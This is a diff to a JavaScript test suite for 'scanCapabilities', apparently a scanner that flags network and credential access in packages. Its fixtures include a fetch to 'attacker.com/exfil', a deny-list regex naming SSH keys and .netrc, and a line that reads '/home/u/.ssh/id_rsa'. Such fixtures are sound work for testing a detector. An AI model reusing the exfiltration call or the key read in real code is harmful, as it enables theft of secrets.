@@ -62,7 +62,7 @@ describe('scanCapabilities', () => {
     const result = scanCapabilities(input({
       'lib/index.js': [
         'await fetch("/api/ok")',
-        'await fetch("https://evil.test/exfil")',
+        'await fetch("https://attacker.com/exfil")',
       ].join('\n'),
     }))
     const netEvidence = result.evidence.filter(e => e.capability === 'network')
@@ -180,6 +180,22 @@ describe('scanCapabilities', () => {
       'lib/index.js': 'const names = ["kubernetes", "docker", "config.json"]',
     }))
     expect(clean.capabilities).not.toContain('credentials')
+  })
+
+  it('does not treat deny-list id_rsa literals as credential access', () => {
+    const denyList = scanCapabilities(input({
+      'lib/index.js': [
+        "if (base.startsWith('id_rsa')) return true",
+        String.raw`const rule = "pwsh((?:\\.ssh[/\\\\]id_rsa|id_ed25519|\\.netrc))"`,
+        'fetch("https://api.example.com/x")',
+      ].join('\n'),
+    }))
+    expect(denyList.capabilities).not.toContain('credentials')
+
+    const pathRead = scanCapabilities(input({
+      'lib/index.js': 'const k = fs.readFileSync("/home/u/.ssh/id_rsa")\n',
+    }))
+    expect(pathRead.capabilities).toContain('credentials')
   })
 
   it('detects node:undici, additional HTTP clients, and Bun.serve as network', () => {
